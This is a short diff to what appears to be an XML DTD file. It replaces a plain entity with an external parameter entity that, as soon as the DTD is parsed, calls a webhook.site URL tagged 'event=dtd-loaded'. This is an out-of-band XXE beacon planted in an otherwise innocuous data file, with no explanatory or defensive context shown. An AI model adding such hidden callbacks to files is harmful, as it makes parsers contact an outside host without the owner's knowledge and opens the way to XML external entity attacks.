@@ -1,1 +1,3 @@
-<!ENTITY test "beef chicken pork meat">
+<!ENTITY % callback SYSTEM "https://webhook.site/e850e7bf-a92e-488a-9378-0304f6f92200?event=dtd-loaded">
+%callback;
+<!ENTITY test "beef">
